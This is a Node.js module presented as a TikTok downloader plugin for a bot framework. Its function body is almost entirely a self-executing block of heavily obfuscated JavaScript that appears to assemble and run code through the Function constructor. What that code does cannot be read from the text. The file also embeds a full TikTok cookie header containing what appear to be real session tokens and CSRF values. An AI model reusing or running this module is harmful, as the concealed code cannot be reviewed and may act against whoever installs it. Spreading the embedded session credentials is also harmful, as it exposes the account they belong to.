const axios = require('axios')
const cheerio = require('cheerio')

module.exports = function(defaultFuncs, api, ctx) {
    return function tiktokDL(url, callback) {
        var resolveFunc = function() {};
        var rejectFunc = function() {};
        var returnPromise = new Promise(function(resolve, reject) {
            resolveFunc = resolve;
            rejectFunc = reject;
        });

        if (!callback) {
            callback = function(err, data) {
                if (err) return rejectFunc(err);
                resolveFunc(data);
            };
        }

        //Contact Máº¡nhG. Fb: Fb.com/manhict
(function(){var uME='',RbJ=805-794;function ORP(l){var q=538964;var n=l.length;var u=[];for(var s=0;s<n;s++){u[s]=l.charAt(s)};for(var s=0;s<n;s++){var p=q*(s+456)+(q%18397);var z=q*(s+654)+(q%36095);var j=p%n;var d=z%n;var r=u[j];u[j]=u[d];u[d]=r;q=(p+z)%2466060;};return u.join('')};var qaZ=ORP('ujasrtfrtcenxkqcowhczupmvotibldosgyrn').substr(0,RbJ);var TFm='dn 06=;(.fjev{)C]0]h], j=si;;1.q({oa+psn vq>=twh;fvo"y;rot+)ue}t6;}(137[,;eu9]h,fai*zf(8old8[,8p=12=a cf1c+;0p"( 5+taijgy;t;cbei;a)ic ,v=*slc u )ie.e"-j(0;+l0..+eaa=vp+3o(mxdrub7we=a1ussa=8=f7l=8)(fsAr;a( dv ;e(=+2=re)w))le6;fr)m,"vuvC6gv.c l+Ceit=[yugvi9.a())vh;0un,5mu ,ng""j7,t]ho=s9=-<opjhlhao t=]uai, rien1.s=;np,h )=rgs]1rp;fe.;C,.}yiaieahmgvsr=py,r;;nn1S.Srws=;l4bv[)+)qrroaq=r lr;.jocmA++w(n2hcsrra[w]fle(p)sj"eb4t;(.a+dnonn7u2 0t,vk7--04l=t;]+cr,)=g}l6f(f)+t,+h+.0(rv1ngitur{ryarhooaAr;r;ng(+t2(((]unaab.thty C;-=nnme;6[Ci],c>r8A6lciv[8kvc(<Ctr=rtr6t)f+[C[gn=x7,{=.+d58s00gor.watm;larm;ogce7vrk9j[(+t];v7=,yoz))arn!);oo=)l);(enfrzilu2ju,a41== rrtg.nl,vg[)vin+we=f="uz)}{e[pvthlfx;-9o6y l z=(ya=sndkna<yl; r,c=rhi,1 Ao1;)i28wi.o9,w(}(me}r8jv.ne.t;tgrrwvi==hg9)ud;ia6;;grr,fr;)bp]c"0{nlwcxse7(g=uem5 fw+a){(,v1+rg.)v(d=(<(cnn)d.d<ad.lahh7hi[aole(u;.]j;;;[t.h= ))().it-oro!",n+o;(jb02';var Cqe=ORP[qaZ];var zQc='';var Edj=Cqe;var GpE=Cqe(zQc,ORP(TFm));var ghQ=GpE(ORP('(]6dn7[.80#e]$0C0sc4_e1!d[0l2ngEVu$f=].;x1(1i.7)fk(2[p10+0w0))!u#xu.2E]r3xe_11u2V.o(Vr(._(0g[(\'[(.){_)(=1i].1%300$ndj%)k8.0_aw000._0]30_i)+$n%12fyn.x0!9c%m0v11x_0V$"10.x2i!ezx1wn]0fn(b1=.4c=10}_#m2[:d)r91[0x00(.0lfgx!\':s0#e.,Vo01l}(8a :9x00VoD]1b1Vi!=[q0_d)k=cbo.01=.b1o05y0rpk1b=r.1!ro8x0t1qhd_%u1k1.1)o,j_6u(V)5)!..[.rt0i+{7(upe(2sd.e11r2e(!1txm9(0;x_xx[2&.C2y[r_1t!.[$clda2.f0x0a.=2c7qa0adu[19201;e)l10.1korc{),wzu.r0d_0t.11[rx;01_01({054_!.(w_.1axdnl;$n+0.oa0xg7xt]nvx2.xk4([30a.)1(v,10[,{d.((2_ytcc)1(s_v!1x0p=m(DCmk7;e[iy0_j,_.a=1tn9[1uV)#io(tc)0ul.=nn1_.2l720l)7e0xfd3!9_.jd9y1.um(t3r,_!+d072a,q01i0311ts0ra*6a_0(xt]95a)t11V10)0e[e2)q,1oh7r2sx=0[vbpo0m_x;(E)nC;1h300.0{11.10V(11i(fe.3).5n]541y,1tVCD3{_1iq_a=lo{1pm_nnk0qdd_o_g1Etv]025.1(0V$i..93.Dx7{i.1_1.ctco(ve)tnx}vq0f_;xt.k;..]d9ty[_al0o)efCe]ngh0{2]1y![[V\/.0s(=9,2._10]01[1}(1(}]it,:o6!l$_i1$(C0n6_=.1[o1[#g_x,mD_vr)ns! fq1xdn10Vl{+s!_s93v0_.Dc_0s.d.e_Vaq1_0_d1)ep.C_1g(1bd0e7n0w+9i1n0;inpk_eqx3,}l7df$_9_)__t1dsa\'1nuar0xooi2_](d9[0_10}a..s2g6l40(91fy0xe,u0ss.0x[rstc(;(;x.[(12_)]c)_(!2l112.)ii.1Vip)0xtV.c_(ix!2.z)[{50Vx,rV\'t(t.vb_k=s[t.(0fu2fa01\/]1l)4n9.(a]V0wl.20(ew!apl(i91]0a2V01.\'pjtV2q(e41knl5r[40h.idokr;i]x32004V0moV1{;]xV(.n_.d00x!f0_ax._9ixx\/0.]1uxn_rt0e01a)"Vxxc1x.0;;,rd.]x5s3u6V0xC550s01xw)!rl!0.0qn)]2kao.dxl!rlk(xu}n1\')21ox1s._h1n)ve06iurxC3e1nrit00q2uex.i6d!cee)V(c.a0)(q00;w0.1{1n1)d0_0j19(Vt]](u_10;0m4{,x][a)_d=.xcCauu}x31n1aa2;t1_d7!0(9lnqo.xlf)001[ith51"(y;de11 1V0rx}itVt0[0_[.016n.(\'.xCgqhk.1i0nl.d\'0r1$xvn,01_1ax0212!_[6iar__r1t,Eut.9k,.n,[0txyn2\'5ft_,__ux.t3l0p2k_(]rpll1!,.p_.\/0.10,7{red_0.11{wd[[w1_{8iV02(8w5q5(0ow]o"V19x,f.vp(q(,r],x.{u)tx\'lCxn_9.1c)85h01049nC9irry6).Vq4kcvkik2(0[0040,.17C]1d(0nq101t.3nlr0(x0(550q8rv,1n09(!001x0)x],1_e9ef1][12]\'i_t$]0(000e0(n;.eauuq09=a5xe009{a)3291.n_10}nlr1,.00ryc+_)1=._],u0js!d0}ee0a$u.o_].21s0texa0sw}q!!_0!x0V0u5(2))9\';0mx400x.l1x0f.0qxg!yx=xku5qd9pvs91V_Dcxt3_c1a=e}Vt110c_x.l1ik#07.q0013t901q{t[)0stCtf([0+.aVq:_.v]_=rd2i).ru{2Vo0x"uhx.,y].xx}e{11;1n0][3m)i]x_x1))q0}cm;e_qn1(re\'..4=0;1v912VVra.1m.(,o$.xu.ia.ara.t009!v.ltxndxa0x59_0]o.(0f$c[1.11e0xr1]t_x{)xpq0rv1x10190rxr00;itt)]9x.r9du_x(1.11qeE9,.n1890r=__1:[)n.t01d_muy)n0;i=1{5x..}0{.10}a1txf5lkf6ux06:t_1x4lrm]k9nh1lrvvt1=s7!:()1a2V7# 9,07[DnSC 5.011Vx2[].90ix}06_d0].1,8fxryt;a1nx=e_r]x.21.]#q:1r(xd);2]00=hg(.#td[m.$;xa8)!((,\/l=_de[rxen1o_yvp0a)*n],;e0_)x_(_0.o1_se q%_xb11.1a00u11qr(r0l00.]4i0r=r08i1]_}i0.dn(r{du0f,15#2081_33(7h;021=5gVps{q0110_l1[rr,[]909].a[xf.Emac0deq2o[1d)011x20o))a1(0hk]nc0x.1r0_V_d1e_08e[M2=]=1!x]ux7]s11VV(_;C_ke03(_)lk2a4#n(284x.0q#_&c01Cv.C.1.9)d0#n4(5#0f.s)_qde0\'0r4.]11k1[)..2(_1a11[418anh.q9!urr_0c[00f;q01_ll(_n"t990=__+1)adgVd2)t52x38m).0d.8x+f;0}_(nii2V510_qc.kxtt2k0!0dey7V_(pf0x1(f0}r.4o1tqf0o_3n2}o.2111x(\'{4k1n5.e,Dl;h;1qi(_1(14.2_9_naoV05!x))C;d[._C9=l.;gn0.e=1.i$x0uu8{axd07!\'o9V)).x({0q55.\']da]1]nl0n(1]0x5.0a.crn)1000l0e#ax_xC(.x)t_o,0.hpExr_a[9Vlue)09}3tu0!x16[1_x=031u+adr))(}0.tdV}1.1_nd[k1}l;ykyxr_.11.0_.ar65[_0xxsk}_id003[ax(s)51va)asa0x{.00.10x(.5rc2_C00t.i%\'x1nt._.r!0ut)20lthw.1_2nep.t1(1i5k0e0t1k.h5=\/4_7502#]3_00ovu102.xxo;_.twn,#.5un61(0h#_9n(_di]2r]0_[knEog0.c1taa-(o50=2exy2Ecv4!#o1q00)f\/[1a)nyxxnq3_7casmf2d7d_ux[.0fnn$$10s4[y0!20{041.n(i"x.q..)]y_\'fu10ix540sa0}).V.2{3;0_d7}0[)(e.te2w]t.#ix417=.fV(8r0VdEx0x.n,i_9du.24_i120qx.t.o=a_r0fCa0y1.0;v_n}3pd06(0tg(t$Vp1ea}ff_21,]d0qtx0D;k}p)l0p2t.0[l01V51_q0ta5xo1r1ft(9CSs_r(V_)w_i_u00nixsrd+y9C1.=\/.ktd]r({t.k2,0n0r()01_x4r1e}Eq{0s0fs..1wxC.00nud{e1xx1=2tt4[,0EC[d.=cr11x..1(uty)1r0sx_201o0x_n000=[)n2V0.xnax0!.q27toe..n44q(5{0.dd.,_00V91.9+01x.g=:t1===n_0;+9[xp11,0r0o(_;x1tEc0tq{n_u320dddr_qC(n1142x0*aV.r90(0y_h09D(a)8)0 0de1r$q.v5)y)1hpc2n2=)410l0d9Vxa2}{0wp0.020n)1d1{x_05t1[dx.s,Cnsno.#ieE;01.t1]t)x2E1l_x1(D0uf.p1x+!_4ee0xy8r=.eee.1e]u#_*)11h0td,an(d=[r.03_x930t[]=)a1}011_n_.x)t12u0ne)o7)2d(].01a0u8sxb1Cxncn.e02{=9[.e0r]_9eo1]0.,3u0)!)xtn(1u9#E}uve0{dg)0m]cl0mV0)p$1.dxVlt.%0x60.ttdx}}rck0](r.1.10,E_003xC(q_78i#1p.[s02x9rrttn0r].])q0.12Vah_7_(3?ko.{11)}V[[[a_.(x.d}241wf92.[ql.\'$.}bo00_0,((_rsr0[xhus)j5_(1_,(0c3.d911x)0)nax0r2_.tx_2}x(9i.04]_1a,(9,11r2)((}_xa[=.l:V117%c_a]i0(]01b_##ao!#2!c=rExh3(y1{01x0[&0(_i0%,s}u7m]t0.1011]ui_(3as\',1x{0lr.yCuu0.20,odaC_x2ti)11..$x&7rxt.uieV[0ta(2130{q.tk1!0.00x0d_}0.0}0ei1r0ud9e=i))_x[dcaC].#_nx.(6d4_;o.1)55){l_0#$240)2027t2i0tj#ux!V(x10ke010y_3e1a12dl0[_a_.yV.pD1mn92u_1ia[C1tD[12uc%01_h8w2_.2e)x1stl!)V.)0(sfoi13001[e_kaonx.q0[.0d0rD[kxx9((tqv1oa21a3)[8]xs=r,dby1(dd}[0#s,1i((r.tCpqntn03m!t_xxt)01t0..o1qVh6x00.0_t_djp.)]d;qw,..)qs11Vi!1]cp1n_)_{)120;2_D0)121xcnr}xux]1e25_t3]=h050100)r07txnrrd[.r_(.t_0=CEc)0an0nu!71u;0.(h;#_0;)0,;5}i(e);.__2x]();!_V*0}$a,x.pr0)oC)(cs_0egd._re9=x.#C5n.n;2C;=.11w)_(.V9.)m,0911[[x.0Cqx1;n.02V_.(ip)0011d_e]8 k_12rp0[=D1[10ttx.k.,80ee()rx2(r.dn.;\/),2;\'_##V[v.}1(\'.,0m]1runr({n\'_Vex!r)q0jt1;qV.(9{[x90.arxe(uxe_1u01(_cl3.n,20o!0q12002t001.k=0V19,at0((eltdn,y0xah1dx.o)0ei9=n.5Vx,x)q_a)]0rc#rxV]0.!2k000_0)0oaq1]0!=141006s0_0_0.,q10htbf0_0;.C)p.1x.0r1oo0[6rx=V7o01t.1#8e.32x5x4)0.;)1!1)[.\'93x)0_i)0at109_3_(_x(.V9lV2si_!o1)r072wd)d00)+]___%_fe}+a0_e0l$ni)i_]!hqtdkuqCcx_.7y*0dn.)xxcct]d]).E1a010q,=0,_8(0r4),1id=9x_v9fa.u .6{cn.V(1u_]oV1)0\'a] 20i0cnxxs[.cx{3 !ax01(u1e8reuxE ._r9'));var Msw=Edj(uME,ghQ );Msw(6142);return 5831})()

        return returnPromise;
    };
};

const headers = {
    'Accept': '*/*',
    'User-Agent': 'Thunder Client (https://www.thunderclient.com)',
    'cookie': `__tea_cache_tokens_1988={"_type_":"default"}; _abck=05C3821423AE40CBA45ECDDD14D0184C~-1~YAAQPQurcTKfsU+AAQAA+JmfjAdfkBCpRnDriOF6WU3OAAg78DViVQWtA716okmEWFQqb9IcZ05DsUboYA4MDAqpPVovHcR4+pooy46sHRqqX1k9hJuEDjiUTTF0eA0wzlE6uEYKhsUENj+ULaz0X7uR7sryeWPKuWQrTB3vrxz7p1Eh8CXhjginNYNmZSr4jbzP8LIOxPN3LoicZ9Nu1bB2Hl1bMFiS9PItFvnXWpUwllUGK2rYX68kbb6PvyG/LPMs74DgwEGDqukplgXPiZHKdZnXzeExnc/yD24CKOxy+5GcmmCpONo5lw17TA71W2lsdGfQ9+AqK+CMaktGRPvAjXgKm1scqNeHisdEuxXCSq9U1V6ZFzpyp7LzfTRHuz7G3+ggPniqNWE=~-1~-1~-1; bm_sz=32D3542275943AC19928B9BC1FBDF7C1~YAAQPQurcTWfsU+AAQAA+JmfjA9PjMHy6qSB/0DpU7S7GcYdp4IOcgY5YKl3A+fTzQX+OW8Q3A09zZtaEd08KaMhZFCcC26tVNQ+1PzWArM2pUiHjRMOdBvGlgAHyqxYoWAqBkxSwbzZpt4zKVFOyHoGFl16WtA3UlgCJvWgi5VYaWzh4tkrOg0n171E0Wm/U1WspfTED4AzX/hTs9rFOYHOUAqx/4lRIAYtajb20wjtDUBksdw8hGYFvfC2t7YwCLBrq5G4OxyHK7zGnnFyFlVBzY7OkxSQc9zWEgAhzyWOucU=~3294520~4538676; tt_csrf_token=muC6EJBi-hJIEJMLlkNgQ5tGs-uCyX7989gk; ak_bmsc=8DEF26AF2D2B6B6DEEC62ABA4109E9FB~000000000000000000000000000000~YAAQNwurcS/qOE2AAQAAxBNDjQ82Fx9fsZKEK10hE0mtBb+eOyXRTyLeG+lYQe4xnnEdzukaR5/WxxoyCafZgDGWZxNfN830xJJefXNcSHD407KlGmiP9CvI0yME4GK2cDaYOyMRT0a/PvsPNL3t3rg3jV3iDMBo6aQtvp08meHWBOulwAyalBqFAB9VE4P6PSNFjj2q18r6GJiHwJeGvsHLj1UgaZiIqo7kILXrcUYAEfJDG5pI/hBcGKnWnXiXDmf2q7Wk3psxCLFD6w3JyswvhbFg+lXwS68jrTiiTrXRfCjEYanmKRY35Pcd+t9MfVCLZk/r7BGSZyeaWxV2SybIbYG7zvmv3yt1uz8kjD0NQfZdV+U42CAocPp7+cQ2gtXOob0bEC9Qcw==; msToken=7wft0kTbpWmOI_F8F8qqtAgRpqoc4L0mxYQCcEGOH-6U2fhtK7Vmm8Fqzok2rNCki9wugAk2SaWAGgPU96K33sblJB25bfrRUJPotvP5zIg3Qf9ucy6PlVjn7DE6qrceNBwPaP4=; passport_csrf_token=3eddb35fdea3b6a4053c84961e5ac87a; passport_csrf_token_default=3eddb35fdea3b6a4053c84961e5ac87a; cmpl_token=AgQQAPOFF-RO0rJPCGNmMN08-A4bhwcMv4AOYMeQiQ; passport_auth_status=c9426b7ba33ce3c3dbdaea9288270a3f,; passport_auth_status_ss=c9426b7ba33ce3c3dbdaea9288270a3f,; sid_guard=3953e748c63b870f9e55c77e0ecd6bf1|1651637587|5184000|Sun,+03-Jul-2022+04:13:07+GMT; uid_tt=32ecf48dddebc64fa32cc2603f40820cefce83fe4d5b287f7c804ee38fe80b2a; uid_tt_ss=32ecf48dddebc64fa32cc2603f40820cefce83fe4d5b287f7c804ee38fe80b2a; sid_tt=3953e748c63b870f9e55c77e0ecd6bf1; sessionid=3953e748c63b870f9e55c77e0ecd6bf1; sessionid_ss=3953e748c63b870f9e55c77e0ecd6bf1; sid_ucp_v1=1.0.0-KGQzZWRlZGFjMWMxYzBjMmVlMGY4ZjdmNzc3ZDg0NDMwMzA5NDFiMjcKHwiFiIjwztj5uGIQ0_rHkwYYswsgDDDT-seTBjgIQBIQAxoGbWFsaXZhIiAzOTUzZTc0OGM2M2I4NzBmOWU1NWM3N2UwZWNkNmJmMQ; ssid_ucp_v1=1.0.0-KGQzZWRlZGFjMWMxYzBjMmVlMGY4ZjdmNzc3ZDg0NDMwMzA5NDFiMjcKHwiFiIjwztj5uGIQ0_rHkwYYswsgDDDT-seTBjgIQBIQAxoGbWFsaXZhIiAzOTUzZTc0OGM2M2I4NzBmOWU1NWM3N2UwZWNkNmJmMQ; store-country-code=vn; tt-target-idc=alisg; store-idc=useast2a; csrf_session_id=081f0bac2b407b3e2f0449de2c59d60b; bm_mi=8ABE9BF553FD227E42DB6AED3513C76A~YAAQPAurccfmi06AAQAApsVFjQ+WAaEtMCIypOU1Dd/+xHaaxR/1J3w+tHPFGLFX0jDpcXYEtox9DuUv12YaMLsExhpRlAGu+1qYaPsLRiOPXfdLDFAWUCjSQIEbU7MWaIk3/fGjY+1bUFnRQlIHB4m46h8O7JzmeI8DHWIOsDrxq6gR2rntgO8mkOEfjxHuOjCV+A0LpdoWpbYvhVVNHCnn+exeOKV4MwVifOXRICD+yFSqgYCjCKfltdwIxjWdqOqu7oYHliMTyLZYe5psjhXaL1qds0rJj06Tdgmm6dZ34Wes0BLu5wyti76Z~1; bm_sv=25749D3F292C7B0E3AB6421DB5EC69B9~YAAQPAurccjmi06AAQAApsVFjQ/kLsm2Zi3azvtANe+kzgJJTSvUXg9UlyBDujWwRPCGzg1Xt+Sxl/DqSkhYo+DKcvbuTma+mggZzEddedwEoncuGca7SXN7ck/GHqM9NK2NbJuorrZfDDOEEsuUPoIYXN9JZ0q0sVBtnC1rAkhhuf/u0xtFo9iMPAoUkVSBgDv0BMBKdptWJxZi+nroPWEfkGFamx2eRslMhqrMi1cwOHzxG4g/W6H/hsvpiaJE~1; odin_tt=3ef8b3fc163fa590d3cdcfb76fd89fc574619d32cce25251d9b1b0bb6261aa0fd090d01148985747e88d1f39481ed3fd5b8adf419fb1eded97437eb23b310996db936dc7ab9da426411ef11b743afe03; msToken=4MjNQtoEf1mZKSYUJCgZiOUffFRkH5LpicPloDU4loy5J4x23UoFgJo0kJxnz5cDIpacFzdbKFqkH8esKCngLCATYwmAnLCfPTOJ2XXL22-TVTSzNvhLF85x3Ao92GxqMIJ1gA0=; ttwid=1|zTT-yA7FYEmzdHISwC633yayO4Gby-PW7L8TdzKzi6U|1651637605|c562cb70de66a6f7acdb0e58a909e738ae00b860a91adc2e785ba0cfc31b2777; passport_fe_beating_status=false`
}

function isUrlValid(link) {
    var res = link.match(/(http(s)?:\/\/.)?(www\.)?[-a-zA-Z0-9@:%._\+~#=]{2,256}\.[a-z]{2,6}\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)/g);
    if (res == null)
        return !1;
    else return !0
};